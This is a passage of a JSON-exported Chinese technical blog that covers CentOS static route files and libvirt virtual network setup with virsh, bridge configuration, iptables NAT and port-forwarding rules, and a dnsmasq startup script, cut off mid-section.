route-eth0\uff1a\\n\u9ed8\u8ba4\u7f51\u5173 192.168.0.1, \u63a5\u53e3eth0. \u4e24\u6761\u9759\u6001\u8def\u7531\u5230 10.10.10.0/24 \u548c172.16.1.0/24 :\\n\\n```\\ndefault via 192.168.0.1 dev eth0\\n10.10.10.0/24 via 10.10.10.1 dev eth1\\n172.16.1.0/24 via 192.168.0.1 dev eth0\\n```\\n#### \u7f51\u7edc/\u63a9\u7801\u6307\u4ee4\u683c\u5f0f\uff1a\\n\\nroute-interface\u6587\u4ef6\u7684\u7b2c\u4e8c\u79cd\u683c\u5f0f.\u4e0b\u9762\u662f\u6837\u677f:\\n```\\nADDRESS0=X.X.X.X\\nNETMASK0=X.X.X.X\\nGATEWAY0=X.X.X.X\\n```\\nADDRESS0=X.X.X.X \u9759\u6001\u8def\u7531\u7684\u7f51\u7edc\u7f16\u53f7.\\nNETMASK0=X.X.X.X \u4e3a\u4e0a\u9762\u90a3\u884c\u8bbe\u7f6e\u5b50\u7f51\u63a9\u7801 .\\nGATEWAY0=X.X.X.X  \u80fd\u591f\u8fde\u63a5\u5230 ADDRESS0=X.X.X.X \u8fd9\u4e2a\u7f51\u7edc\u7684\u7f51\u5173\\n\\n\u914d\u7f6e\u793a\u4f8b route-eth0\uff1a\\n\u9ed8\u8ba4\u7f51\u5173 192.168.0.1, \u63a5\u53e3 eth0. \u4e24\u6761\u523010.10.10.0/24 \u548c172.16.1.0/24 \u7684\u9759\u6001\u8def\u7531\uff1a\\n```\\nADDRESS0=10.10.10.0\\nNETMASK0=255.255.255.0\\nGATEWAY0=10.10.10.1\\nADDRESS1=172.16.1.0\\nNETMASK1=255.255.255.0\\nGATEWAY1=192.168.0.1\\n```\\nADDRESS0, ADDRESS1, ADDRESS2, \u8fd9\u6837\u7684\u7f16\u53f7\u5fc5\u987b\u662f\u4e00\u4e2a\u63a5\u4e00\u4e2a\u7684\u6570\u5b57\u3002"},{"id":"/2013/10/01/libvirt-basic-usage","metadata":{"permalink":"/notes/blog/2013/10/01/libvirt-basic-usage","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2013-10-01-libvirt-basic-usage.md","source":"@site/blog/2013-10-01-libvirt-basic-usage.md","title":"libvirt\u4e2d\u7684\u7f51\u7edc\u7ba1\u7406\u5b9e\u8df5","description":"","date":"2013-10-01T00:00:00.000Z","tags":[{"inline":true,"label":"libvirt","permalink":"/notes/blog/tags/libvirt"},{"inline":true,"label":"network","permalink":"/notes/blog/tags/network"}],"readingTime":9.66,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"libvirt\u4e2d\u7684\u7f51\u7edc\u7ba1\u7406\u5b9e\u8df5","description":"","categories":["virt"],"tags":["libvirt","network"]},"unlisted":false,"prevItem":{"title":"CentOS\u4e2d\u53cc\u7f51\u5361\u9759\u6001\u8def\u7531\u914d\u7f6e","permalink":"/notes/blog/2013/11/11/centos-multi-network-interface-route"},"nextItem":{"title":"\u6b63\u786e\u4f7f\u7528shell\u8fd4\u56de\u503c","permalink":"/notes/blog/2013/05/17/bash-shell-exit-code"}},"content":"> \u9010\u6b65\u5206\u6790libvirt\u4e2d\u7684\u7f51\u7edc\u7ba1\u7406\u65b9\u6cd5\u53ca\u5b9e\u8df5\uff0c\u5206\u6790\u5728nat\u7f51\u7edc\u4e2d\u9047\u5230\u7684\u95ee\u9898\u53ca\u89e3\u51b3\u601d\u8def\\n\\n\\n\\n\\n## libvirt\u7f51\u7edc\u57fa\u672c\u6982\u5ff5\\n\\nlibvirt\u9ed8\u8ba4\u4f7f\u7528\u4e86\u4e00\u4e2a\u540d\u4e3adefault\u7684nat\u7f51\u7edc\uff0c\u8fd9\u4e2a\u7f51\u7edc\u9ed8\u8ba4\u4f7f\u7528virbr0\u4f5c\u4e3a\u6865\u63a5\u63a5\u53e3\uff0c\u4f7f\u7528dnsmasq\u6765\u4e3a\u4f7f\u7528nat\u7f51\u7edc\u7684\u865a\u62df\u673a\u63d0\u4f9bdns\u53cadhcp\u670d\u52a1\uff0cdnsmasq\u751f\u6548\u540e\u7684\u914d\u7f6e\u6587\u4ef6\u9ed8\u8ba4\u4fdd\u5b58\u5728\u4ee5\u4e0b\u8def\u5f84\uff1a\\n\\n- /var/lib/libvirt/dnsmasq/default.hostsfile   mac&&ip\u7ed1\u5b9a\u7684\u914d\u7f6e\u6587\u4ef6\\n- /var/lib/libvirt/dnsmasq/default.leases  dhcp\u5206\u914d\u5230\u865a\u62df\u673a\u7684ip\u5730\u5740\u5217\u8868\\n- /var/lib/libvirt/network/default.xml  default\u7f51\u7edc\u7684\u914d\u7f6e\u6587\u4ef6\\n\\ndnsmasq\u670d\u52a1\u7684\u542f\u52a8\u811a\u672c\u5728/etc/init.d/dnsmasq \uff0c\u4f46\u662f\u6211\u4eec\u5982\u679c\u624b\u52a8\u4f7f\u7528\u6b64\u811a\u672c\u6765\u542f\u52a8\u670d\u52a1\u5c06\u4f1a\u5bfc\u81f4dnsmasq\u8bfb\u53d6\u5176\u81ea\u5df1\u7684\u914d\u7f6e\u6587\u4ef6\u6765\u542f\u52a8\u6b64\u670d\u52a1\uff0c\u56e0\u6b64\u8fd9\u4e48\u505a\u662f\u4e0d\u63a8\u8350\u7684\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u670d\u52a1\u5b8c\u5168\u7531libvirtd\u5728\u63a5\u7ba1\uff0c\u5f53libvirtd\u670d\u52a1\u542f\u52a8\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u5c06\u5b83\u7ba1\u7406\u7684\u88ab\u6807\u8bb0\u4e3aautostart\u7684network\u4e00\u5e76\u542f\u52a8\u8d77\u6765\uff0c\u800c\u542f\u52a8network\u7684\u65f6\u5019\u5c31\u4f1a\u81ea\u52a8\u8c03\u7528dnsmasq\u5e76\u8d4b\u4e88\u5176\u9002\u5b9c\u7684\u914d\u7f6e\u6587\u4ef6\u6765\u8fd0\u884c\u670d\u52a1\u3002\\n\\n\u4f7f\u7528libvirt\u7ba1\u7406\u7684\u7f51\u7edc\u90fd\u4f1a\u7528\u5230dnsmasq\u6765\u4ea7\u751f\u76f8\u5e94\u7684\u914d\u7f6e\uff0c\u6bd4\u5982\u5b9a\u4e49\u4e86\u4e00\u4e2a\u540d\u4e3aroute110\u7684network\uff0c\u90a3\u4e48\u8fd9\u4e2aroute110\u5c06\u4f7f\u7528\u4e00\u4e2a\u65b0\u7684\u6865\u63a5\u63a5\u53e3virbr1\u6765\u63a5\u5165\u7f51\u7edc\uff0c\u5e76\u4f7f\u7528dnsmasq\u4ea7\u751f\u540d\u4e3aroute110.hostsfile\u548croute110.leases\u7684\u914d\u7f6e\u6587\u4ef6\u3002\u5176\u5b9e\u8fd9\u91cc\u63d0\u5230\u7684virbr0\u548cvirbr1\u90fd\u662flibvirt\u4ea7\u751f\u7684\u865a\u62df\u7f51\u5361\uff0c\u5176\u4f5c\u7528\u5c31\u76f8\u5f53\u4e8e\u4e00\u4e2a\u865a\u62df\u4ea4\u6362\u673a\uff0c\u4e3a\u865a\u62df\u673a\u63d0\u4f9b\u7f51\u7edc\u8f6c\u53d1\u670d\u52a1\u3002\\n\\n\\n## libvirt\u4e2d\u7f51\u7edc\u7684\u7c7b\u578b\\n\\n\u9996\u5148\u5206\u6790\u4e00\u4e0blibvirt\u6240\u80fd\u63d0\u4f9b\u7684\u7f51\u7edc\u7c7b\u578b\uff1aisolated \u548cforwarding,\u5176\u4e2d\uff0cisolated\u610f\u4e3a\u7edd\u5bf9\u9694\u79bb\u7684\u7f51\u7edc\uff0c\u4e5f\u5c31\u662f\u8bf4\u5904\u4e8e\u6b64\u7f51\u7edc\u5185\u7684\u865a\u62df\u673a\u5bf9\u4e8e\u5916\u754c\u662f\u9694\u79bb\u7684\uff0c\u8fd9\u79cd\u6a21\u5f0f\u53ef\u4ee5\u7528\u5230\u4e00\u4e9b\u7279\u6b8a\u7684\u573a\u5408\uff0c\u6bd4\u5982\u865a\u62df\u673a\u53ea\u63d0\u4f9b\u7ed9\u5185\u90e8\u4f7f\u7528\uff0c\u865a\u62df\u673a\u53ea\u8981\u6c42\u80fd\u76f8\u4e92\u901a\u4fe1\u800c\u4e0d\u9700\u8981\u4e0e\u4e92\u8054\u7f51\u901a\u4fe1\u3002\u53e6\u5916\u4e00\u7c7b\uff0cforwarding\uff0c\u5c31\u662f\u628a\u865a\u62df\u673a\u7684\u6570\u636eforward\u5230\u7269\u7406\u7f51\u7edc\u5b9e\u73b0\u4e0e\u5916\u90e8\u7f51\u7edc\u8fdb\u884c\u901a\u8baf\uff0c\u5176\u4e2dforwarding\u53c8\u5206\u4e3a\u4e24\u79cd\uff1anat\u548crouted\u3002\\n\\n### nat\\n\u5c31\u662f\u628a\u865a\u62df\u673a\u7684\u7f51\u7edc\u6570\u636e\u5728\u7ecf\u8fc7\u7269\u7406\u673a\u7f51\u7edc\u7684\u65f6\u5019\u8fdb\u884cip\u4f2a\u88c5\uff0c\u8fd9\u6837\u6240\u6709\u865a\u62df\u673a\u51fa\u53bb\u7684\u7f51\u7edc\u6570\u636e\u90fd\u76f8\u5f53\u4e8e\u662f\u7269\u7406\u673a\u51fa\u53bb\u7684\u6570\u636e\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5206\u914d\u7ed9\u4f7f\u7528nat\u7f51\u7edc\u7684\u865a\u62df\u673a\u4e00\u4e2a\u5185\u7f51ip\uff0c\u800c\u8fd9\u4e2a\u5185\u7f51ip\u7684\u865a\u62df\u673a\u8bbf\u95ee\u51fa\u53bb\u7684\u65f6\u5019\u5916\u90e8\u7f51\u7edc\u770b\u5230\u7684\u662f\u7269\u7406\u673a\u7684\u516c\u7f51ip\uff0c\u8fd9\u6837\u505a\u7684\u7528\u5904\u5c31\u662f\u5b9e\u73b0\u591a\u4e2a\u865a\u62df\u673a\u5171\u4eab\u7269\u7406\u4e3b\u673a\u7684\u516c\u7f51ip\uff0c\u8282\u7701\u516c\u7f51ip\u5730\u5740\uff1b\u5982\u524d\u6240\u8ff0\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0blibvirt\u5df2\u7ecf\u63d0\u4f9b\u4e86\u4e00\u4e2a\u540d\u4e3adefault\u7684nat\u7f51\u7edc\uff0c\u5728\u4e0d\u9700\u8981\u8fdb\u884c\u4efb\u4f55\u914d\u7f6e\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528default\u7f51\u7edc\u7684\u865a\u62df\u673a\u5373\u53ef\u8bbf\u95ee\u4e92\u8054\u7f51\uff0c\u4f46\u662f\u4e92\u8054\u7f51\u5374\u65e0\u6cd5\u8bbf\u95ee\u865a\u62df\u673a\u63d0\u4f9b\u7684\u670d\u52a1\uff0c\u8fd9\u662f\u56e0\u4e3adefault\u7f51\u7edc\u53ea\u5bf9\u865a\u62df\u673a\u7684\u6570\u636e\u5305\u8fdb\u884c\u4e86\u4f2a\u88c5\uff0c\u800c\u6ca1\u6709\u8fdb\u884cdnat\u548csnat\u3002\\n\\n\u9700\u8981\u6ce8\u610f\u7684\u662flibvirt\u6240\u5b9e\u73b0\u7684\u8fd9\u79cdnat\u7f51\u7edc\u662f\u901a\u8fc7\u7269\u7406\u673a\u7684iptables\u89c4\u5219\u6765\u5b9e\u73b0\u7684\uff0c\u4e5f\u5373\u662f\u5728\u865a\u62df\u673a\u6570\u636e\u7ecf\u8fc7nat\u8868\u7684postrouting\u94fe\u51fa\u53bb\u7684\u65f6\u5019\u5bf9\u5176\u8fdb\u884c\u4e86\u4f2a\u88c5\u3002\\n\\n### routed\\nforwarding\u6a21\u5f0f\u7684\u53e6\u5916\u4e00\u79cd\uff0crouted\uff0c\u5c31\u662f\u5c06\u865a\u62df\u673a\u7684\u6570\u636e\u76f4\u63a5\u901a\u8fc7\u7269\u7406\u673aroute\u51fa\u53bb\uff0c\u548cnat\u4e00\u6837\uff0c\u4e5f\u662f\u9700\u8981\u4e00\u4e2avirbr\u865a\u62df\u7f51\u5361\u63a5\u53e3\u6765\u4e0e\u5916\u9762\u8fdb\u884c\u901a\u4fe1\uff0c\u8fd9\u79cd\u6a21\u5f0f\u7684\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u865a\u62df\u673a\u7684\u6570\u636e\u6ca1\u6709\u7ecf\u8fc7\u4f2a\u88c5\u4fbf\u76f4\u63a5\u4ea4\u7ed9\u4e86\u5916\u90e8\u7f51\u7edc\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f7f\u7528route\u6a21\u5f0f\u7f51\u7edc\u7684\u865a\u62df\u673a\u53ef\u4ee5\u4f7f\u7528\u516c\u7f51ip\u5730\u5740\uff0c\u800c\u7269\u7406\u673a\u5374\u6070\u6070\u5728\u8fd9\u4e2a\u65f6\u5019\u5b8c\u5168\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u5185\u7f51ip\u800c\u4e0d\u5bf9\u5916\u63d0\u4f9b\u8bbf\u95ee\uff0c\u8fd9\u6837\uff0c\u865a\u62df\u673a\u7684\u7f51\u5361\u4ec5\u4ec5\u628a\u7269\u7406\u673a\u5f53\u4f5c\u4e00\u4e2aroute\u6570\u636e\u7684\u5de5\u5177\uff0c\u6b64\u6a21\u5f0f\u5e94\u7528\u7684\u573a\u5408\u5f88\u591a\uff0c\u6bd4\u5982\u9700\u8981\u8ba9\u865a\u62df\u673a\u8fd0\u884c\u5728\u4e00\u4e2admz\u7f51\u7edc\u4e2d\u3002\u4f46\u662f\u4f7f\u7528route\u6a21\u5f0f\u6709\u8bf8\u591a\u9650\u5236\uff0c\u4f8b\u5982\u7269\u7406\u673a\u7684\u7f51\u7edc\u63a5\u53e3\u4e0d\u591f\u7528\u7684\u60c5\u51b5\u4e0b\u3002\\n\\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cnat\u6a21\u5f0f\u548croute\u6a21\u5f0f\u7684\u533a\u522b\u4ec5\u4ec5\u5728\u4e8e\u524d\u8005\u4f7f\u7528\u4e86iptables\u5bf9\u865a\u62df\u673a\u7684\u6570\u636e\u5305\u8fdb\u884c\u4e86\u4f2a\u88c5\uff0c\u800c\u540e\u8005\u6ca1\u6709\u3002\\n\\n\\n## \u81ea\u5b9a\u4e49routed\u7f51\u7edc\\n\\n\u5728\u5b9e\u9645\u7684\u865a\u62df\u673a\u4f7f\u7528\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u78b0\u5230\u4e0b\u9762\u7684\u60c5\u51b5\uff1a\\n\\n- 1 \u4f7f\u7528nat\u7f51\u7edc\u7684\u865a\u62df\u673a\u4e5f\u9700\u8981\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\uff0c\\n- 2 \u7269\u7406\u673a\u53ea\u6709\u4e00\u4e2a\u7f51\u5361\u548c\u4e00\u4e2aip\uff0c\u800c\u6211\u4eec\u73b0\u5728\u65e2\u9700\u8981\u901a\u8fc7\u8fd9\u4e2a\u7f51\u5361\u6765\u7ba1\u7406\u865a\u62df\u673a\uff0c\u53c8\u9700\u8981\u4f7f\u7528\u8fd9\u4e2a\u7f51\u5361\u6765\u63d0\u4f9broute\u7f51\u7edc\u3002\\n\\n\u5f53\u7136\u4f60\u6240\u80fd\u78b0\u5230\u7684\u95ee\u9898\u53ef\u80fd\u5343\u5947\u767e\u602a\uff0c\u4e5f\u53ef\u80fd\u6839\u672c\u6ca1\u6709\u78b0\u5230\u8fc7\u6b64\u7c7bbt\u95ee\u9898\u3002\u4e0b\u9762\u7684\u5185\u5bb9\u53ea\u4f5c\u4e3a\u5206\u6790\u548c\u89e3\u51b3\u95ee\u9898\u7684\u601d\u8def\uff0c\u4e0d\u80fd\u751f\u642c\u3002\u5728\u4e86\u89e3\u4e86libvirt\u7684\u7f51\u7edc\u7ba1\u7406\u6a21\u5f0f\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u81ea\u5df1\u52a8\u624b\u89e3\u51b3\u8fd9\u4e9b\u9650\u5236\uff0c\u4e0b\u9762\u91cd\u70b9\u89e3\u91ca\u7b2c\u4e8c\u79cd\u95ee\u9898\u7684\u89e3\u51b3\u65b9\u6cd5\uff1a\\n\\n\u9996\u5148\u5047\u5b9aroute\u7f51\u7edc\u4f7f\u7528\u7684\u662fvirbr1\u865a\u62df\u7f51\u5361\uff0c\u800c\u865a\u62df\u673a\u4f7f\u7528virbr1\u6765\u4e3a\u865a\u62df\u673a\u63d0\u4f9b\u670d\u52a1\uff0c\u800c\u6211\u672c\u673a\u53c8\u6709\u4e86\u4e00\u4e2abr0\u4f5c\u4e3aem1\u7684\u6865\u63a5\u7f51\u5361\u6765\u5bf9\u5916\u63d0\u4f9b\u7f51\u7edc\u670d\u52a1\uff0cbr0\u7684ip\u662f192.168.1.51\\n\\n\u9996\u5148\u7981\u7528br0\uff1a\\n\\n~~~\\nifdown br0\\n~~~\\n\\n\u5e76\u914d\u7f6ebr0\u7684onboot\u4e3ano,\u914d\u7f6e\u6587\u4ef6\u4e3a`onboot=no`\\n\\n\u7136\u540e\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u540d\u4e3aroute\u7684\u7f51\u7edc\uff0cvirbr1\u7684ip\u8bbe\u7f6e\u4e3a192.168.1.51 \uff0c\u8fd9\u6837\u505a\u7684\u76ee\u7684\u662f\u8ba9virbr1\u53d6\u4ee3\u4e4b\u524d\u7684br0.\\n\\n~~~xml\\n<network>\\n<name>route</name>\\n<uuid>6224b437-386b-f510-11d5-58d58b1ce87a</uuid>\\n<forward mode=\'route\'/>\\n<bridge name=\'virbr1\' stp=\'on\' delay=\'0\' />\\n<mac address=\'52:54:00:C8:9F:07\'/>\\n<ip address=\'192.168.1.51\' netmask=\'255.255.255.0\'>\\n<dhcp>\\n<range start=\'192.168.1.128\' end=\'192.168.1.254\' />\\n</dhcp>\\n</ip>\\n</network>\\n~~~\\n\\n\u63a5\u7740\u751f\u6210\u5e76\u542f\u7528\u8be5\u7f51\u7edc\\n~~~\\nvirsh net-define route.xml\\nvirsh net-start route\\nvirsh net-autostart route\\n~~~\\n\\n- /etc/libvirt/qemu/networks/  virsh net-define\u7684network\u4f1a\u4fdd\u5b58\u5230\u8fd9\\n- /var/lib/libvirt/network/  net-start\u542f\u52a8\u4e86\u7684network\u540c\u65f6\u4e5f\u4f1a\u4f1a\u4fdd\u5b58\u5230\u8fd9\\n- /etc/libvirt/qemu/networks/autostart/  net-autostart\u7684network\u540c\u65f6\u4e5f\u4f1a\u4fdd\u5b58\u5230\u8fd9\\n\\n\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u9700\u8981\u4fee\u6539em1\u7684\u914d\u7f6e\u5e76\u5c06\u5176\u6865\u63a5\u5230virbr1\u4e0a\\n\\nifcfg-em1\\n\\n~~~\\nDEVICE=\\"em1\\"\\nONBOOT=\\"yes\\"\\nBRIDGE=virbr1\\n~~~\\n\\n\u63a5\u7740\u542f\u52a8em1\\n\\n~~~\\nifup em1\\n~~~\\n\\n\u81f3\u6b64em1\u5c31\u88ab\u6865\u63a5\u5230\u4e86virbr1\u4e0a\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u68c0\u67e5\\n\\n~~~\\nbrctl show\\n~~~\\n\\n\u73b0\u5728\u6211\u4eec\u9700\u8981\u5728\u672c\u673a\u6dfb\u52a0\u4e00\u6761\u9ed8\u8ba4\u8def\u7531\uff0c\u4e0d\u7136\u865a\u62df\u673a\u662f\u8bbf\u95ee\u4e0d\u4e86\u5916\u9762\u7684\uff1a\\n\\n~~~\\nroute add default gw 192.168.1.1 dev virbr1\\n~~~\\n\\n\u8fd9\u91cc\u7684192.168.1.1\u662f\u771f\u5b9e\u7684\u8def\u7531\u3002\u81f3\u6b64\uff0c\u95ee\u9898\u5df2\u7ecf\u89e3\u51b3\u4e86\u3002\\n\\n## \u81ea\u5b9a\u4e49nat\u7f51\u7edc\\n\\n\u4e0b\u9762\u8bf4\u8bf4\u95ee\u98981\u7684\u89e3\u51b3\u65b9\u6cd5\uff1a\\n\u65e2\u7136\u77e5\u9053\u4e86nat\u51fa\u53bb\u7684\u865a\u62df\u673a\u53ea\u80fd\u8bbf\u95ee\u5916\u7f51\u800c\u5916\u7f51\u5374\u4e0d\u80fd\u8bbf\u95ee\u8fdb\u6765\uff0cnat\u53c8\u662f\u901a\u8fc7iptables\u6765\u505a\u7684\uff0c\u4e5f\u5c31\u662f\u5f53libvirt\u6bcf\u6b21\u542f\u52a8\u7684\u65f6\u5019\u90fd\u4f1a\u5f80iptables\u6700\u524d\u9762\u63d2\u5165\u81ea\u5df1\u7684\u89c4\u5219\u4ee5\u4fdd\u8bc1nat\u7684\u865a\u62df\u673a\u80fd\u6b63\u5e38\u8bbf\u95ee\u5916\u7f51\uff0c\u90a3\u4e48\u6211\u4eec\u662f\u4e0d\u662f\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539iptables\u7684\u89c4\u5219\u6765\u5b9e\u73b0\u5462\uff0c\u6bd4\u5982\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u5185\u7f51ip\u7684\u865a\u62df\u673a\u5bf9\u5916\u63d0\u4f9b80\u670d\u52a1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u628a\u7269\u7406\u673a\u768480\u7aef\u53e3\u6620\u5c04\u5230\u8fd9\u53f0\u865a\u62df\u673a\u768480\u7aef\u53e3\u4e0a\uff0c\u56e0\u4e3a\u6211\u4eec\u7684\u7269\u7406\u673a\u662f\u53ef\u4ee5\u76f4\u63a5\u548c\u865a\u62df\u673a\u901a\u4fe1\u7684\uff0c\u53ea\u662f\u5916\u7f51\u4e0d\u80fd\u800c\u5df2\uff0c\u4e0b\u9762\u6dfb\u52a0\u89c4\u5219\uff1a\\n\\n~~~\\niptables -t nat -A PREROUTING -p tcp -i virbr1 --dport 80  -j DNAT --to-destination 192.168.122.2:80\\n~~~\\n\\n\u8fd9\u6837\u6211\u4eec\u5bf9\u5916\u90e8\u8bbf\u95ee80\u7aef\u53e3\u8fdb\u6765\u7684\u6570\u636e\u8fdb\u884c\u4e86dnat\uff0c\u800c\u51fa\u53bb\u7684\u6211\u4eec\u4e0d\u7528snat\uff0c\u53ea\u9700\u8981\u518d\u6dfb\u52a0\u5982\u4e0b\u89c4\u5219\uff1a\\n\\n~~~\\niptables -I FORWARD -i virbr1 -o virbr0 -p tcp -m state --state NEW -j ACCEPT\\n~~~\\n\\n\u81f3\u6b64\u95ee\u9898\u770b\u4f3c\u5f97\u5230\u89e3\u51b3\uff0c\u4f46\u662f\u6211\u4eec\u5ffd\u7565\u4e86\u4e00\u4e2a\u5173\u952e\u7684\u95ee\u9898\uff0c\u90a3\u5c31\u662f\u6bcf\u5f53libvirt\u542f\u52a8\u7684\u65f6\u5019\u5c31\u4f1a\u5f80\u8868\u7684\u6700\u524d\u9762\u63d2\u5165\u5b83\u81ea\u5df1\u7684\u89c4\u5219\uff0c\u800ciptables\u7684\u89c4\u5219\u662f\u6709\u5148\u540e\u987a\u5e8f\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u81ea\u5df1\u6dfb\u52a0\u7684\u89c4\u5219\u5728libvirtd\u670d\u52a1\u91cd\u542f\u4e4b\u540e\u5373\u88ablibvirt\u5b9a\u4e49\u7684\u89c4\u5219\u6240\u6df9\u6ca1\uff0c\u600e\u4e48\u529e\u5462\uff0c\u6211\u73b0\u5728\u53ea\u60f3\u5230\u4e86\u8fd9\u4e48\u4e00\u4e2a\u65b9\u6cd5\uff0c\u76f4\u63a5\u4fee\u6539libvirtd\u7684\u542f\u52a8\u811a\u672c\uff0c\u5728\u5b83\u7684\u89c4\u5219\u751f\u6548\u4e4b\u540e\u63d2\u5165\u6211\u4eec\u81ea\u5b9a\u4e49\u7684\u89c4\u5219\uff1a\\n\\nvi  /etc/init.d/libvirtd\\n~~~\\nstart() {\\n    echo -n $\\"Starting $SERVICE daemon: \\"\\n    initctl_check\\n\\n    mkdir -p /var/cache/libvirt\\n    rm -rf /var/cache/libvirt/*\\n    KRB5_KTNAME=$KRB5_KTNAME daemon --pidfile $PIDFILE --check $SERVICE $PROCESS --daemon $LIBVIRTD_CONFIG_ARGS $LIBVIRTD_ARGS\\n    RETVAL=$?\\n    echo\\n    [ $RETVAL -eq 0 ] && touch /var/lock/subsys/$SERVICE\\n    sleep 1\\n    iptables -D FORWARD -i virbr1 -o virbr0 -p tcp -m state --state NEW -j ACCEPT\\n    iptables -I FORWARD -i virbr1 -o virbr0 -p tcp -m state --state NEW -j ACCEPT\\n... ...\\n~~~\\n\\n\u81f3\u6b64\u95ee\u9898\u57fa\u672c\u89e3\u51b3\u3002\\n\\n## route\u7f51\u7edc\u8f6c\u6362nat\u7f51\u7edc\\n\u53e6\u5916\u4e00\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u524d\u9762\u6709\u53d1\u73b0route\u548cnat\u7684\u7f51\u7edc\u533a\u522b\u4ec5\u4ec5\u662f\u4e00\u4e2a\u505a\u4e86nat\u7684iptables\u89c4\u5219\u4e00\u4e2a\u6ca1\u6709\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4e0d\u53ef\u4ee5\u81ea\u5df1\u5728iptables\u91cc\u9762\u6dfb\u52a0\u76f8\u5e94\u7684\u89c4\u5219\u5c06route\u7f51\u7edc\u53d8\u8eab\u4e3anat\u7f51\u7edc\u5462\uff1f\u7b54\u6848\u80af\u5b9a\u662f\u53ef\u4ee5\u7684\uff0c\u53ea\u9700\u8981\u6dfb\u52a0\u4e0a\u4e0b\u9762\u7684\u89c4\u5219\u5373\u53ef,\u539f\u7406\u8fd8\u8bf7\u89c2\u770b\u672c\u6587\u7684\u540c\u5b66\u81ea\u5df1\u5206\u6790\uff0c\u8fd9\u91cc\u5047\u8bbe\u6211\u4eecroute\u7f51\u7edc\u7ed9\u865a\u62df\u673a\u5206\u914d\u7684ip\u662f192.168.100.0/24\u7f51\u6bb5\uff1a\\n\\n~~~\\niptables -t nat -A POSTROUTING -s 192.168.100.0/24 -d ! 192.168.100.0/24 -j MASQUERADE\\niptables -A FORWARD --destination 192.168.100.0/24 -m state --state RELATED,ESTABLISHED -j ACCEPT\\n~~~\\n\\n## \u81ea\u5b9a\u4e49dnsmasq\\n\u8fd9\u91cc\u518d\u6dfb\u52a0\u4e00\u4e2a\u53ef\u4ee5\u624b\u5de5\u542f\u52a8dnsmasq\u7684\u5c0f\u811a\u672c\\n\\n~~~bash\\n#!/bin/bash\\nbrctl addbr routebr\\nifconfig routebr 192.168.122.1 netmask 255.255.255.0\\niptables -t nat -A POSTROUTING -s 192.168.122.0/24 -d ! 192.168.122.0/24 -j MASQUERADE\\niptables -A FORWARD --destination 192.168.122.0/24 -m state --state RELATED,ESTABLISHED -j ACCEPT\\n/usr/sbin/dnsmasq \\\\\\n--strict-order \\\\\\n--bind-interfaces \\\\\\n--pid-file=/usr/local/vps/network/default.pid \\\\\\n--conf-file= \\\\\\n--except-interface lo \\\\\\n--listen-address 192.168.122.1 \\\\\\n--dhcp-range 192.168.122.2,192.168.122.254 \\\\\\n--dhcp-leasefile=/usr/local/vps/network/dnsmasq/default.leases \\\\\\n--dhcp-lease-max=253 \\\\\\n--dhcp-no-override \\\\\\n--dhcp-hostsfile=/usr/local/vps/network/dnsmasq/default.hostsfile\\n~~~\\n\\n## \u91cd\u542fnetwork\u5bfc\u81f4\u7f51\u7edc\u4e2d\u65ad\\n\\n\u5f53\u6211\u4eec\u9700\u8981\u5b9e\u65f6\u4fee\u6539network\u7684\u914d\u7f6e\u5e76\u4f7f\u4e4b\u751f\u6548\u7684\u65f6\u5019\uff0c\u5c31\u5f97\u91cd\u65b0\u542f\u52a8\u6b64network\uff0c\u4e5f\u5c31\u662f\u9700\u8981net-destroy\u518dnet-start\u4e00\u4e0b\uff0c\u6211\u4eec\u7684\u914d\u7f6e\u624d\u80fd\u751f\u6548\uff0c\u4f46\u662f\u968f\u4e4b\u800c\u6765\u7684\u95ee\u9898\u662f\uff0c\u5f53network\u88ab\u91cd\u65b0\u542f\u52a8\u4e4b\u540e\uff0c\u865a\u62df\u673a\u4fbf\u65e0\u6cd5\u8bbf\u95ee\u7f51\u7edc\u4e86\uff0c\u9664\u975e\u628a\u865a\u62df\u673a\u7684network interface\u91cd\u65b0attach\u4e00\u4e0b\uff0c\u6216\u8005\u7b49\u5230\u865a\u62df\u673a\u91cd\u65b0\u542f\u52a8\uff0c\u90a3\u4e48\u4e3a\u4ec0\u4e48\u4f1a\u51fa\u73b0\u8fd9\u6837\u7684\u95ee\u9898\u5462\uff1f\u6211\u4eec\u5148\u4ece\u5b83\u7684\u8868\u8c61\u5f00\u59cb\u5206\u6790\uff0c\u81f3\u4e8e\u662f\u5426\u8981\u8ffd\u7a76\u5230\u6e90\u7801\u91cc\u9762\u5c31\u53d6\u51b3\u4e8e\u540c\u5b66\u4eec\u81ea\u5df1\u4e86\uff0c\u53cd\u6b63\u6211\u6682\u65f6\u6ca1\u90a3\u529f\u592b\u3002\u8fd9\u91cc\u4ec5\u4ec5\u662f\u629b\u51fa\u6765\u4e86\u4e00\u5757\u7816\u3002\\n\\n\u5f53\u4e00\u4e2anetwork\u542f\u52a8\u4e4b\u540e\uff0c\u4f1a\u81ea\u52a8\u751f\u6210\u4e00\u4e2a\u865a\u62df\u7f51\u5361\u63a5\u53e3\u5982virbr1\uff0c\u4e5f\u4f1a\u751f\u6210\u5176\u4ed6\u4e00\u4e9b\u9700\u8981\u7684\u4e1c\u897f\uff0c\u800c\u91cd\u65b0\u542f\u52a8\u4e86libvirt\u7684network\u4e4b\u540e\u8f